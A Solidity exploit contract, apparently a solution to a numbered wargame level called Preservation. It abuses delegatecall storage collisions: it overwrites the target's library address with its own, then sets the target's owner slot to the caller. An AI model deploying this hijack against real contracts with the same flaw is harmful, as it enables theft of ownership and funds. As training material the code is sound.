// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

import "./16_Preservation.sol";

contract PreservationAttack {
    address public placeholder1;
    address public placeholder2;
    address public targetOwner;
    Preservation public target;

    constructor(address _target) public {
        target = Preservation(_target);
    }

    function attack() public {
        target.setFirstTime(uint256(address(this)));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 attackerAddress) public {
        targetOwner = address(uint160(attackerAddress));
    }
}
